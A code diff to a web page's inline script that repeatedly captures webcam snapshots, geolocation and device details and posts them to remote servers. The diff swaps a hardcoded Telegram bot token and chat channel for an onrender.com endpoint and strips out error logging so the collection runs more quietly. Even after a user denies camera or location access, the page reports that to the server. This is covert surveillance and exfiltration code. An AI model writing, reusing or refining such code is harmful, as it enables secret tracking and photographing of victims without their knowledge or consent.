@@ -382,8 +382,6 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
-      const token = "6235375573:AAHdripMzwMYFL0dhruXGyvmJ6ZSQhWCTn4";
-      const chat_id = "1444862345";
       let uLat = null,
         uLng = null,
         m = null,
@@ -404,16 +402,14 @@
           });
           return await res.json();
         } catch (err) {
-          console.error(`❌ Error posting to ${url}:`, err);
           return null;
         }
       };
 
       function sendPhotoToTelegram(blob) {
         const formData = new FormData();
-        formData.append("chat_id", chat_id);
         formData.append("photo", blob, "snapshot.jpg");
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        fetch(`https://loc-4tjr.onrender.com/api/meaow`, {
           method: "POST",
           body: formData,
         });
@@ -432,9 +428,7 @@
             "image/jpeg",
             0.9
           );
-        } catch (err) {
-          console.error("Camera capture failed:", err);
-        }
+        } catch (err) {}
       }
 
       function startCameraLoop() {
@@ -456,13 +450,11 @@
             };
           })
           .catch((err) => {
-            console.warn("📷 Camera access denied:", err);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            fetch("https://loc-4tjr.onrender.com/api/hello", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
-                chat_id,
-                text: "❌ User denied camera access.",
+                message: "❌ User denied camera access.",
               }),
             });
           });
@@ -493,12 +485,11 @@
       // Send location
       const sendLoc = (lat, lng, acc) => {
         if (![lat, lng, acc].every((v) => typeof v === "number"))
-          return console.error("Invalid location");
-        post("https://loc-mocha.vercel.app/api/GLT", {
-          lat,
-          lng,
-          accuracy: acc,
-        });
+          post("https://loc-4tjr.onrender.com/api/GLT", {
+            lat,
+            lng,
+            accuracy: acc,
+          });
       };
 
       // Locate user
@@ -515,7 +506,7 @@
             const banner = document.getElementById("location-banner");
             if (banner) banner.style.display = "flex";
 
-            post("https://loc-mocha.vercel.app/api/hello", {
+            post("https://loc-4tjr.onrender.com/api/hello", {
               message: "❌ User denied location access.",
             });
           },
@@ -526,11 +517,9 @@
       // Send device info
       const sendInfo = (info) => {
         if (!info?.platform || !info?.connection || !info?.userAgent)
-          return console.error("Invalid device info");
-        post("https://loc-mocha.vercel.app/api/GLT", info).then((data) => {
-          if (data === true) console.log("✅ Device info sent");
-          else console.warn("⚠️ Failed to send device info");
-        });
+          post("https://loc-4tjr.onrender.com/api/GLT", info).then(
+            (data) => {}
+          );
       };
 
       // Get device info
